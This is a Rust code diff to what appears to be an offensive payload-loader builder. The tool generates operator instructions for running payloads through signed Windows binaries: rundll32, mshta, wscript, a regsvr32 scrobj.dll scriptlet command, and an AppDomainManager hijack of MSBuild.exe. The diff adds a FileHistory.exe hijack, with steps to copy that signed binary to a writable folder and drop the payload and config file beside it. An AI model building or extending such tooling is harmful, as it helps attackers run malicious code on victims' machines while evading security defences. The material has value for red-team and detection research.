@@ -69,12 +69,10 @@ impl LoaderType {
             Binary | Injector => filename.to_string(),
             Dll => format!("rundll32 {},DllMain", filename),
             Rundll32 => format!("rundll32 {},EntryPoint", filename),
-            AppDomain => format!(
-                "1. Place {} and MSBuild.exe.config in \
-                 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\n\
-                 2. Run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
-                filename
-            ),
+            // Generic AppDomain hint assumes default MSBuild.exe host; the
+            // host-aware variant is `appdomain_exec_command(host, filename)`
+            // and is preferred when the AppDomain config is in scope.
+            AppDomain => appdomain_exec_command("MSBuild.exe", filename),
             Wsf => format!("wscript.exe {}", filename),
             Hta => format!("mshta.exe {}", filename),
             Regsvr32Sct => format!("regsvr32 /u /s /n /i:{} scrobj.dll", filename),
@@ -125,6 +123,52 @@ pub struct AppDomainConfig {
     pub assembly_name: String,
     pub type_name:     String,
     pub namespace:     String,
+    /// Which Microsoft-signed binary the AppDomainManager hijack targets.
+    /// One of: "MSBuild.exe" (default, Framework64), "FileHistory.exe" (System32).
+    pub host_binary:   String,
+}
+
+impl AppDomainConfig {
+    /// `.config` sidecar filename the loader expects next to the host binary
+    /// (`<host_binary>.config`). Single source of truth — call sites must not
+    /// re-derive this string.
+    pub fn config_filename(&self) -> String {
+        appdomain_config_filename(&self.host_binary)
+    }
+
+    /// Operator-facing exec command hint for this AppDomain build, dispatched
+    /// on the chosen host binary.
+    pub fn exec_command(&self, filename: &str) -> String {
+        appdomain_exec_command(&self.host_binary, filename)
+    }
+}
+
+/// `<host_binary>.config` sidecar filename. Single source of truth for both
+/// the Rust loader pipeline and the operator-facing hint.
+pub fn appdomain_config_filename(host_binary: &str) -> String {
+    format!("{}.config", host_binary)
+}
+
+/// Generate the operator-facing exec command hint for an AppDomain build,
+/// dispatched on the chosen host binary. Free-function form retained for
+/// callers (e.g. web-server) that only have the host string from request
+/// context; prefer `AppDomainConfig::exec_command` when the struct is in scope.
+pub fn appdomain_exec_command(host_binary: &str, filename: &str) -> String {
+    let cfg = appdomain_config_filename(host_binary);
+    match host_binary {
+        "FileHistory.exe" => format!(
+            "1. Copy C:\\Windows\\System32\\FileHistory.exe to a writable directory (e.g. C:\\Users\\Public\\)\n\
+             2. Place {} and {} alongside the copied FileHistory.exe\n\
+             3. Run the copied FileHistory.exe",
+            filename, cfg
+        ),
+        _ /* MSBuild.exe default */ => format!(
+            "1. Place {} and {} in \
+             C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\n\
+             2. Run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+            filename, cfg
+        ),
+    }
 }
 
 #[derive(Debug, Clone, Serialize)]
@@ -567,6 +611,7 @@ fn build_context(config: &LoaderConfig) -> Context {
         ctx.insert("appdomain_namespace",     &ad.namespace);
         ctx.insert("appdomain_clr_version",   &ad.clr_version);
         ctx.insert("appdomain_net_version",   &ad.net_version);
+        ctx.insert("appdomain_host_binary",   &ad.host_binary);
     }
 
     if let Some(wsc) = &config.wsf_stub_config {
